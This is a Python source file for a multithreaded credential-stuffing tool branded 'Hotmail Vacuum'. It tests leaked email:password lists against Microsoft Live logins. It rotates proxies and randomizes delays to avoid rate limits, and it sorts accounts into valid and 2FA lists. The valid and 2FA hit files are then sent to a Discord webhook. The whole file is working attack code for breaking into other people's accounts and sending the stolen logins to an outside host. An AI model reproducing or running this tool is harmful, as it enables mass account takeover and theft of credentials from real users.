import os
import sys
import yaml
import requests
import random
import time
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from mailhub import LiveAuthenticator

class Palette:
    RED = '\033[38;5;196m'
    GREEN = '\033[92m'
    YELLOW = '\033[38;5;226m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

printMutex = Lock()
fileMutex = Lock()
statsMutex = Lock()

CONFIG_DIR = "config"
CONFIG_PATH = os.path.join(CONFIG_DIR, "config.yml")

BASE_CONFIG = {
    'threads': 200,
    'use_proxies': False,
    'proxy_type': None,
    'proxy_file': None,
    'discord_webhook': False,
    'delay_enabled': True,
    'delay_seconds': 0.7
}

def clearTerminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def ensureConfigFolder():
    if not os.path.exists(CONFIG_DIR):
        os.makedirs(CONFIG_DIR)

def loadSettings():
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, 'r') as f:
                return yaml.safe_load(f) or BASE_CONFIG
        except Exception:
            return BASE_CONFIG.copy()
    return BASE_CONFIG.copy()

def saveSettings(cfg):
    ensureConfigFolder()
    try:
        with open(CONFIG_PATH, 'w') as f:
            yaml.dump(cfg, f, default_flow_style=False)
    except Exception as e:
        print(f"{Palette.RED}[ERROR] {str(e)}{Palette.RESET}")

def sendToDiscord(webhook, validCount, twofaCount):
    if not webhook:
        return
    try:
        filesData = {}
        embedsList = []
        if validCount > 0 and os.path.exists('hits.txt'):
            with open('hits.txt', 'rb') as f:
                filesData['hits.txt'] = f.read()
            embedsList.append({
                "title": f"✓ {validCount} Valid Accounts",
                "description": "File attached: hits.txt",
                "color": 0x00FF00,
                "timestamp": datetime.now(timezone.utc).isoformat()
            })
        if twofaCount > 0 and os.path.exists('2fa.txt'):
            with open('2fa.txt', 'rb') as f:
                filesData['2fa.txt'] = f.read()
            embedsList.append({
                "title": f"⚠️ {twofaCount} 2FA Accounts",
                "description": "File attached: 2fa.txt",
                "color": 0xFFFF00,
                "timestamp": datetime.now(timezone.utc).isoformat()
            })
        if embedsList:
            payload = {"embeds": embedsList}
            files = {name: (name, content) for name, content in filesData.items()}
            requests.post(webhook, data={"payload_json": str(payload).replace("'", '"')}, files=files, timeout=10)
    except Exception:
        pass

def loadProxyList(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except FileNotFoundError:
        print(f"{Palette.RED}[ERROR] Proxy file '{filename}' not found!{Palette.RESET}")
        return []
    except Exception as e:
        print(f"{Palette.RED}[ERROR] {str(e)}{Palette.RESET}")
        return []

def configureSettings(cfg):
    print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Proxy Settings{Palette.RESET}")
    print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Use proxies? {Palette.YELLOW}y/n{Palette.RESET}")
    useProxy = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip().lower()
    cfg['use_proxies'] = (useProxy == 'y')
    
    if cfg['use_proxies']:
        print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Proxy Type{Palette.RESET}")
        print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Type (http/https/socks4/socks5){Palette.RESET}")
        ptype = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip().lower()
        if ptype not in ['http', 'https', 'socks4', 'socks5']:
            print(f"{Palette.YELLOW}[!] Invalid, defaulting to http{Palette.RESET}")
            ptype = 'http'
        print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Proxy File{Palette.RESET}")
        print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} File name (e.g., proxies.txt){Palette.RESET}")
        pfile = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip()
        if pfile:
            cfg['proxy_type'] = ptype
            cfg['proxy_file'] = pfile
        else:
            cfg['use_proxies'] = False
            cfg['proxy_type'] = None
            cfg['proxy_file'] = None
    else:
        cfg['proxy_type'] = None
        cfg['proxy_file'] = None
    
    print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Thread Settings{Palette.RESET}")
    print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Thread count (max 500){Palette.RESET}")
    thrInput = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip()
    try:
        thr = int(thrInput)
        cfg['threads'] = max(1, min(thr, 500))
    except ValueError:
        print(f"{Palette.YELLOW}[!] Invalid, keeping current{Palette.RESET}")
    
    print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Rate Limiting (Delay){Palette.RESET}")
    print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Enable delay between requests? {Palette.YELLOW}y/n{Palette.RESET}")
    delayChoice = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip().lower()
    cfg['delay_enabled'] = (delayChoice == 'y')
    if cfg['delay_enabled']:
        print(f"{Palette.CYAN}╭─ {Palette.BOLD}Delay Seconds{Palette.RESET}")
        print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Seconds between requests (0.3 - 1.5){Palette.RESET}")
        secInput = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip()
        try:
            sec = float(secInput)
            cfg['delay_seconds'] = max(0.3, min(sec, 1.5))
        except:
            cfg['delay_seconds'] = 0.7
    
    print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Discord Webhook{Palette.RESET}")
    print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Use Discord webhook? {Palette.YELLOW}y/n{Palette.RESET}")
    webhookChoice = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip().lower()
    if webhookChoice == 'y':
        print(f"{Palette.CYAN}╭─ {Palette.BOLD}Discord Webhook{Palette.RESET}")
        print(f"{Palette.CYAN}│{Palette.RESET} {Palette.MAGENTA}[Config]{Palette.RESET} Enter webhook URL{Palette.RESET}")
        whUrl = input(f"{Palette.CYAN}╰─>{Palette.RESET} ").strip()
        cfg['discord_webhook'] = whUrl if whUrl else None
    else:
        cfg['discord_webhook'] = None
    
    saveSettings(cfg)
    print(f"\n{Palette.GREEN}[✓] Configuration saved!{Palette.RESET}")
    time.sleep(1)
    return cfg

def showConfig(cfg):
    threadsLine = f"Threads: {cfg['threads']}"
    proxyStat = "Yes" if cfg['use_proxies'] else "No"
    proxyLine = f"Use Proxies: {proxyStat}"
    delayStat = "Enabled" if cfg.get('delay_enabled') else "Disabled"
    delayLine = f"Delay: {delayStat}"
    if cfg.get('delay_enabled'):
        delayLine += f" ({cfg.get('delay_seconds', 0.7)}s)"
    webhookStat = "Enabled" if cfg.get('discord_webhook') else "Disabled"
    webhookLine = f"Discord Webhook: {webhookStat}"
    
    maxLen = max(len("Current Configuration:"), len(threadsLine), len(proxyLine), len(delayLine), len(webhookLine))
    if cfg['use_proxies'] and cfg.get('proxy_file'):
        ptypeLine = f"Proxy Type: {cfg.get('proxy_type', 'http')}"
        pfileLine = f"Proxy File: {cfg.get('proxy_file', 'N/A')}"
        maxLen = max(maxLen, len(ptypeLine), len(pfileLine))
    boxW = maxLen + 4
    
    print(f"\n{Palette.CYAN}╔{'═' * boxW}╗{Palette.RESET}")
    title = "Current Configuration:"
    titlePad = boxW - len(title) - 2
    print(f"{Palette.CYAN}║{Palette.RESET} {Palette.MAGENTA}{Palette.BOLD}{title}{Palette.RESET}{' ' * titlePad} {Palette.CYAN}║{Palette.RESET}")
    print(f"{Palette.CYAN}╠{'═' * boxW}╣{Palette.RESET}")
    
    thrCol = Palette.GREEN
    thrText = f"Threads: {thrCol}{cfg['threads']}{Palette.RESET}"
    thrPad = boxW - len(threadsLine) - 2
    print(f"{Palette.CYAN}║{Palette.RESET} {thrText}{' ' * thrPad} {Palette.CYAN}║{Palette.RESET}")
    
    proxyColor = Palette.GREEN if cfg['use_proxies'] else Palette.RED
    proxyText = f"Use Proxies: {proxyColor}{proxyStat}{Palette.RESET}"
    proxyPad = boxW - len(proxyLine) - 2
    print(f"{Palette.CYAN}║{Palette.RESET} {proxyText}{' ' * proxyPad} {Palette.CYAN}║{Palette.RESET}")
    
    delayColor = Palette.GREEN if cfg.get('delay_enabled') else Palette.RED
    delayText = f"Delay: {delayColor}{delayStat}{Palette.RESET}"
    if cfg.get('delay_enabled'):
        delayText += f" ({cfg.get('delay_seconds', 0.7)}s)"
    delayPad = boxW - len(delayLine) - 2
    print(f"{Palette.CYAN}║{Palette.RESET} {delayText}{' ' * delayPad} {Palette.CYAN}║{Palette.RESET}")
    
    if cfg['use_proxies'] and cfg.get('proxy_file'):
        ptypeCol = Palette.YELLOW
        ptypeText = f"Proxy Type: {ptypeCol}{cfg.get('proxy_type', 'http')}{Palette.RESET}"
        ptypePad = boxW - len(ptypeLine) - 2
        print(f"{Palette.CYAN}║{Palette.RESET} {ptypeText}{' ' * ptypePad} {Palette.CYAN}║{Palette.RESET}")
        pfileCol = Palette.YELLOW
        pfileText = f"Proxy File: {pfileCol}{cfg.get('proxy_file', 'N/A')}{Palette.RESET}"
        pfilePad = boxW - len(pfileLine) - 2
        print(f"{Palette.CYAN}║{Palette.RESET} {pfileText}{' ' * pfilePad} {Palette.CYAN}║{Palette.RESET}")
    
    webhookColor = Palette.GREEN if cfg.get('discord_webhook') else Palette.RED
    webhookText = f"Discord Webhook: {webhookColor}{webhookStat}{Palette.RESET}"
    webhookPad = boxW - len(webhookLine) - 2
    print(f"{Palette.CYAN}║{Palette.RESET} {webhookText}{' ' * webhookPad} {Palette.CYAN}║{Palette.RESET}")
    print(f"{Palette.CYAN}╚{'═' * boxW}╝{Palette.RESET}")

def isValidPair(line):
    line = line.strip()
    if not line:
        return False
    spamSigns = ['telegram', 't.me', 'discord', 'http://', 'https://', '___By@', 'C--l--o--u--d', '!!!', 'H--O--T--M--A--I--L', '(ow)z', 'BACK_UP', '##', '@@', '__', '--']
    if any(s.lower() in line.lower() for s in spamSigns):
        return False
    if line.count(':') != 1:
        return False
    parts = line.split(':', 1)
    if len(parts) != 2:
        return False
    mail, pwd = parts
    mail = mail.strip()
    pwd = pwd.strip()
    if '@' not in mail or len(mail) < 3:
        return False
    if not pwd or len(pwd) < 1:
        return False
    validChars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-+')
    if not all(c in validChars for c in mail):
        return False
    return True

def loadCombinations(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            allLines = [line.strip() for line in f if line.strip()]
        validLines = [line for line in allLines if isValidPair(line)]
        seen = set()
        unique = []
        for line in validLines:
            if line not in seen:
                seen.add(line)
                unique.append(line)
        return unique
    except FileNotFoundError:
        print(f"{Palette.RED}[ERROR] '{filename}' not found!{Palette.RESET}")
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("")
        return []
    except Exception as e:
        print(f"{Palette.RED}[ERROR] {str(e)}{Palette.RESET}")
        return []

def loadAlreadyChecked():
    checkedEmails = set()
    resultFiles = ['hits.txt', '2fa.txt', 'invalid.txt']
    for fname in resultFiles:
        if os.path.exists(fname):
            with open(fname, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        email = line.split(':', 1)[0]
                        checkedEmails.add(email)
    return checkedEmails

def saveResult(filename, content):
    try:
        with fileMutex:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(content + '\n')
        return True
    except Exception:
        return False

def examineAccount(authenticator, email, password, proxySettings, maxRetries=3):
    for attempt in range(maxRetries):
        try:
            outcome = authenticator.authenticate(email, password, proxySettings)
            if outcome[0] != "retry":
                if outcome[0] == "ok":
                    return "VALID", outcome[1] if len(outcome) > 1 else None
                elif outcome[0] == "nfa":
                    return "2FA", None
                elif outcome[0] == "fail":
                    return "INVALID", None
                else:
                    return "INVALID", None
            if attempt < maxRetries - 1:
                time.sleep(1)
        except Exception:
            if attempt == maxRetries - 1:
                return "INVALID", None
            time.sleep(1)
    return "INVALID", None

def showBanner():
    banner = f"""
{Palette.MAGENTA}{Palette.BOLD}██╗  ██╗ ██████╗ ████████╗███╗   ███╗ █████╗ ██╗██╗     
██║  ██║██╔═══██╗╚══██╔══╝████╗ ████║██╔══██╗██║██║     
███████║██║   ██║   ██║   ██╔████╔██║███████║██║██║     
██╔══██║██║   ██║   ██║   ██║╚██╔╝██║██╔══██║██║██║     
██║  ██║╚██████╔╝   ██║   ██║ ╚═╝ ██║██║  ██║██║███████╗
╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝

██╗   ██╗ █████╗  ██████╗██╗   ██╗██╗   ██╗███╗   ███╗
██║   ██║██╔══██╗██╔════╝██║   ██║██║   ██║████╗ ████║
██║   ██║███████║██║     ██║   ██║██║   ██║██╔████╔██║
╚██╗ ██╔╝██╔══██║██║     ██║   ██║██║   ██║██║╚██╔╝██║
 ╚████╔╝ ██║  ██║╚██████╗╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
  ╚═══╝  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝{Palette.RESET}
{Palette.CYAN}                  developed by @tc4dy{Palette.RESET}
"""
    print(banner)

def logOutput(status, combo):
    timestamp = datetime.now().strftime("%H:%M:%S")
    if status == "VALID":
        with printMutex:
            print(f"{Palette.GREEN}[{timestamp}] VALID: {combo}{Palette.RESET}")
    elif status == "2FA":
        with printMutex:
            print(f"{Palette.YELLOW}[{timestamp}] 2FA: {combo}{Palette.RESET}")
    elif status == "INVALID":
        with printMutex:
            print(f"{Palette.RED}[{timestamp}] INVALID: {combo}{Palette.RESET}")

def handleCredential(combo, proxyPool, proxyType, idx, total, stats, delayEnabled, delaySec):
    authenticator = None
    try:
        email, password = combo.split(':', 1)
        authenticator = LiveAuthenticator()
        proxyDict = None
        if proxyPool:
            proxyAddr = random.choice(proxyPool)
            cleanAddr = proxyAddr.split('://', 1)[1] if '://' in proxyAddr else proxyAddr
            if proxyType == 'socks5':
                scheme = 'socks5'
            elif proxyType == 'socks4':
                scheme = 'socks4'
            else:
                scheme = 'http'
            proxyDict = {
                'http': f'{scheme}://{cleanAddr}',
                'https': f'{scheme}://{cleanAddr}'
            }
        status, extra = examineAccount(authenticator, email, password, proxyDict, maxRetries=3)
        with statsMutex:
            stats['checked'] += 1
            if status == "VALID":
                stats['valid'] += 1
                saveResult('hits.txt', combo)
                logOutput("VALID", combo)
            elif status == "2FA":
                stats['2fa'] += 1
                saveResult('2fa.txt', combo)
                logOutput("2FA", combo)
            elif status == "INVALID":
                stats['invalid'] += 1
                saveResult('invalid.txt', combo)
                logOutput("INVALID", combo)
        if delayEnabled:
            time.sleep(random.uniform(delaySec - 0.2, delaySec + 0.2))
    except Exception:
        with statsMutex:
            stats['invalid'] += 1
    finally:
        if authenticator:
            del authenticator

def generateReport(stats, startTime, cfg):
    elapsed = time.time() - startTime
    successRate = (stats['valid'] / stats['total'] * 100) if stats['total'] > 0 else 0
    report = f"""
╔══════════════════════════════════════════════════════════╗
║                     CHECK REPORT                         ║
╠══════════════════════════════════════════════════════════╣
║ Total Accounts:      {stats['total']}
║ Valid (No 2FA):      {stats['valid']}
║ 2FA Required:        {stats['2fa']}
║ Invalid/Failed:      {stats['invalid']}
║ Success Rate:        {successRate:.2f}%
║ Time Elapsed:        {elapsed:.2f} seconds
║ Speed:               {stats['total']/elapsed:.2f} acc/sec
║ Threads Used:        {cfg['threads']}
║ Proxies Used:        {'Yes' if cfg['use_proxies'] else 'No'}
║ Delay Enabled:       {'Yes' if cfg.get('delay_enabled') else 'No'}
╚══════════════════════════════════════════════════════════╝
"""
    with open('report.txt', 'w', encoding='utf-8') as f:
        f.write(report)
    print(f"\n{Palette.CYAN}{report}{Palette.RESET}")

def runChecker():
    clearTerminal()
    showBanner()
    ensureConfigFolder()
    config = loadSettings()
    showConfig(config)
    print(f"\n{Palette.CYAN}╭─ {Palette.BOLD}Configuration{Palette.RESET}")
    happy = input(f"{Palette.CYAN}│{Palette.RESET} Happy with config? {Palette.GREEN}(y to start, n to edit){Palette.RESET}\n{Palette.CYAN}╰─>{Palette.RESET} ").strip().lower()
    if happy == 'n':
        config = configureSettings(config)
        clearTerminal()
        showBanner()
        showConfig(config)
    comboFile = "combos.txt"
    allCombos = loadCombinations(comboFile)
    if not allCombos:
        print(f"\n{Palette.RED}[✗] No valid combos found in combos.txt{Palette.RESET}")
        input(f"\n{Palette.WHITE}Press Enter to exit...{Palette.RESET}")
        return
    alreadyCheckedEmails = loadAlreadyChecked()
    originalCount = len(allCombos)
    freshCombos = []
    for combo in allCombos:
        email = combo.split(':', 1)[0]
        if email not in alreadyCheckedEmails:
            freshCombos.append(combo)
    skipped = originalCount - len(freshCombos)
    print(f"\n{Palette.GREEN}[✓] Loaded {originalCount} combos, {skipped} already checked (skipped){Palette.RESET}")
    print(f"{Palette.GREEN}[✓] Fresh combos to check: {len(freshCombos)}{Palette.RESET}")
    proxyList = []
    if config['use_proxies'] and config.get('proxy_file'):
        proxyList = loadProxyList(config.get('proxy_file'))
        if proxyList:
            print(f"{Palette.GREEN}[✓] Loaded {len(proxyList)} proxies{Palette.RESET}")
            if config['threads'] > 100:
                print(f"{Palette.YELLOW}[!] Reducing threads to 100 for proxy stability{Palette.RESET}")
                config['threads'] = 100
        else:
            print(f"{Palette.YELLOW}[!] No proxies loaded, continuing without proxies{Palette.RESET}")
            config['use_proxies'] = False
    print()
    webhookUrl = config.get('discord_webhook')
    stats = {
        'total': len(freshCombos),
        'checked': 0,
        'valid': 0,
        '2fa': 0,
        'invalid': 0
    }
    startTime = time.time()
    try:
        with ThreadPoolExecutor(max_workers=config['threads']) as executor:
            futures = []
            for i, combo in enumerate(freshCombos, 1):
                future = executor.submit(
                    handleCredential,
                    combo,
                    proxyList,
                    config.get('proxy_type', 'http'),
                    i,
                    stats['total'],
                    stats,
                    config.get('delay_enabled', True),
                    config.get('delay_seconds', 0.7)
                )
                futures.append(future)
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
    except KeyboardInterrupt:
        print(f"\n\n{Palette.YELLOW}[!] Stopped by user{Palette.RESET}")
    print(f"\n\n{Palette.GREEN}{Palette.BOLD}✓ CHECKING COMPLETE!{Palette.RESET}\n")
    if stats['valid'] > 0:
        print(f"{Palette.GREEN}[✓] {stats['valid']} Valid accounts saved to: hits.txt{Palette.RESET}")
    if stats['2fa'] > 0:
        print(f"{Palette.YELLOW}[✓] {stats['2fa']} 2FA accounts saved to: 2fa.txt{Palette.RESET}")
    if stats['invalid'] > 0:
        print(f"{Palette.RED}[✓] {stats['invalid']} Invalid accounts saved to: invalid.txt{Palette.RESET}")
    generateReport(stats, startTime, config)
    if webhookUrl and (stats['valid'] > 0 or stats['2fa'] > 0):
        print(f"\n{Palette.CYAN}[✓] Sending to Discord...{Palette.RESET}")
        sendToDiscord(webhookUrl, stats['valid'], stats['2fa'])
    input(f"\n{Palette.WHITE}Press Enter to exit...{Palette.RESET}")

if __name__ == "__main__":
    try:
        runChecker()
    except KeyboardInterrupt:
        print(f"\n{Palette.YELLOW}[!] Terminated{Palette.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Palette.RED}[ERROR] {str(e)}{Palette.RESET}")
        input(f"{Palette.WHITE}Press Enter to exit...{Palette.RESET}")
        sys.exit(1)